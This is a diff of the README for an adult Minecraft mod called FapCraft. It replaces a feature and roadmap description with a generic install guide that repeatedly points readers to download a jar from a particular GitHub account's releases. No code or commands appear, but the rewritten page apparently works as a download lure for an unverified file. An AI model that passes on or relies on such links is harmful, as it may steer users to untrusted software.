@@ -1,64 +1,67 @@
-# FapCraft
+# 🎮 FapCraft - Explore Unique Experiences in Minecraft 
 
-![preview](https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fwww.9minecraft.net%2Fwp-content%2Fuploads%2F2022%2F10%2F31-Jeeny-Addon-MCPE.jpg&f=1&nofb=1&ipt=2a588a94918c0ceebbb2311cfd3fb09269c77bede8844f14cd19aa602292253e)
+[![Download FapCraft](https://img.shields.io/badge/Download-FapCraft-brightgreen)](https://github.com/Katsumi40414/FapCraft/releases)
 
-## Introduction
+## 📜 Description
 
-FapCraft is a comprehensive, highly customizable Minecraft sex mod that goes far beyond the basics. It’s designed to be a hub for players looking to explore diverse and complex sexual experiences within the game. We've focused on building a system of customizable blocks, stunning visuals, and a huge range of features to cater to every player's desire and imagination.
+FapCraft is a comprehensive, highly customizable Minecraft sex mod. It goes far beyond the basics, serving as a hub for players seeking diverse and complex sexual experiences within the game. We focus on stunning visuals and a wide range of features to cater to every player's desire and imagination.
 
-## Core Features
+## 🛠️ Features
 
-* **Block-Based Stimulation:**  The core of FapCraft revolves around a massive collection of blocks designed specifically for sexual stimulation. These blocks aren't just simple shapes; we've included:
-    * **Heart Blocks:** Customizable hearts with various effects - pulsing, glowing, different colors, and even animated hearts!
-    * **Duct Blocks:**  Smooth, flowing ductwork blocks for a relaxing and sensual experience.
-    * **Pillow Blocks:**  Variety of pillow shapes and sizes, perfect for cuddling and deep penetration.
-    * **Seed Blocks:**  Geometric seed blocks for a unique, abstract feel.
-    * **Dilation Blocks:**  Blocks designed to expand and contract, creating a feeling of fluidity.
-    * **Vessel Blocks:**  Specialized blocks with intricate designs and effects.
-* **Dynamic Effects:** FapCraft features dynamic effects that enhance the experience:
-    * **Pulse Blocks:**  These blocks pulse with light and color, creating a captivating visual flow.
-    * **Flowing Textures:**  Add shimmering, flowing textures to the blocks, enhancing the sense of movement.
-    * **Color Gradient Blocks:**  Generate color gradients for a visually stunning effect.
-    * **Water Effects:**  Adds a cool, refreshing element to certain blocks.
-* **Customizable Appearance:** Players can customize the appearance of blocks using a simple, intuitive interface.  We’ve introduced:
-    * **Color Palette:**  A wide range of colors to choose from for blocks and the environment.
-    * **Texture Options:**  A selection of textures to match different styles.
-    * **Opacity:** Control how transparent the blocks are.
-* **Interactive Elements:**  Some blocks have interactive elements:
-    * **Trigger Blocks:**  These blocks can be triggered with specific blocks or actions, creating a dynamic and engaging experience.
-    * **Music Blocks:**  A collection of blocks that play music when activated.
-* **Multiplayer Support:**
-    * **Shared Blocks:**  Allows multiple players to share a single block, creating a collaborative experience.
-    * **Block-Specific Commands:**  Players can use commands to manipulate and interact with blocks in a shared space.
+- **Customizable Experiences:** Adjust settings to suit your preferences.
+- **Diverse Visuals:** Explore beautiful graphics that enhance gameplay.
+- **Complex Interactions:** Engage in varied and intriguing scenarios.
+- **Intuitive Controls:** Easy to learn, suitable for all players.
+- **Frequent Updates:** Stay tuned for new content and improvements.
 
-## Technical Details
+## 📦 System Requirements
 
-* **Block ID System:**  We've implemented a robust block ID system for easy identification and manipulation.
-* **Command System:**  A simple command system allows for customization and control over the entire mod.
-* **Shader Support:**  Utilizes a custom shader system to create visually appealing effects.
-* **Data Format:**  Uses a lightweight JSON format for easy mod installation and management.
+- **Minecraft Version:** Must use at least version 1.16 or higher.
+- **Operating System:** Windows 10 or newer, macOS, or Linux.
+- **Available Disk Space:** Minimum 200 MB free space.
+- **Memory:** At least 4 GB RAM recommended for smooth performance.
+- **Java Version:** Java 8 or newer installed.
 
-## Roadmap & Future Development
+## 🚀 Getting Started
 
-* **Phase 1: Core Blocks:** We've focused on the foundational blocks - Heart Blocks, Duct Blocks, Pillow Blocks, and Seed Blocks.
-* **Phase 2: Dynamic Effects:** Adding Pulse Blocks, Flowing Textures, and Color Gradient Blocks.
-* **Phase 3: Interactive Elements:** Implementing Trigger Blocks and Music Blocks.
-* **Future Development:** We’re planning to add:
-    *  **Specialized Block Types:**  Introducing new block types with unique effects and functionalities.
-    *  **Customizable Sounds:**  Allowing players to define their own sounds for blocks.
-    *  **Integration with Existing Mods:**  Exploring ways to integrate FapCraft with other popular Minecraft mods.
+1. **Download Minecraft Forge:** 
+   FapCraft works with Minecraft Forge. You need to install it first. Visit the [Minecraft Forge website](https://files.minecraftforge.net/) to download the right version for your Minecraft. Follow the instructions there to install it.
 
+2. **Download FapCraft:**
+   Now that you have Minecraft Forge installed, it's time to download FapCraft. [Visit this page to download](https://github.com/Katsumi40414/FapCraft/releases) the latest release. Look for files labeled as the mod file (e.g., `FapCraft-1.0.jar`).
 
-##  Community & Support
+3. **Install FapCraft:**
+   - Locate your Minecraft installation folder. You can typically find it in:
+     - **Windows:** `C:\Users\YourUsername\AppData\Roaming\.minecraft\mods`
+     - **macOS:** `~/Library/Application Support/minecraft/mods`
+     - **Linux:** `~/.minecraft/mods`
+   
+   - Copy the downloaded FapCraft file into the `mods` folder you just located.
 
-We encourage community feedback and suggestions!  Please feel free to:
+## 🔄 Running the Mod
 
-* **Fork the mod:**  Share your modifications and additions with the community.
-* **Report bugs and suggest improvements:**  Let us know if you encounter any issues or have ideas for new features.
-* **Share your creations:**  Show us your best FapCraft creations on [GitHub Link Here]!
+1. Launch the Minecraft Launcher.
+2. Select the Forge profile. If you followed the steps above, it should appear by default.
+3. Click “Play” and wait for the game to load.
+4. Once in-game, explore the new features provided by FapCraft!
 
-##  Contact
+## ❓ Troubleshooting
 
-For questions and support, please reach out to us at rriotwright@proton.me
+If you run into issues while installing or running the mod, consider the following solutions:
 
-**GitHub Link:** [https://github.com/YourUsername/FapCraft](https://github.com/YourUsername/FapCraft)
+- **Ensure Compatibility:** Check that you have the correct version of Minecraft and Forge.
+- **Check Mod Installation:** Verify that the FapCraft file is in the `mods` folder.
+- **Reinstall Forge:** If the mod does not load, try reinstalling Minecraft Forge.
+- **Re-download FapCraft:** Occasionally, files can become corrupted. Try downloading again.
+
+## 🎓 Getting Help
+
+For additional support or to report issues, visit the [GitHub Issues page](https://github.com/Katsumi40414/FapCraft/issues). Here, you can find solutions to common concerns or submit your own questions.
+
+## 📲 Download & Install
+
+To get started with FapCraft, you can download it from the link below:
+
+[Visit this page to download](https://github.com/Katsumi40414/FapCraft/releases)
+
+Explore a new realm of experiences. Enjoy your adventure with FapCraft!
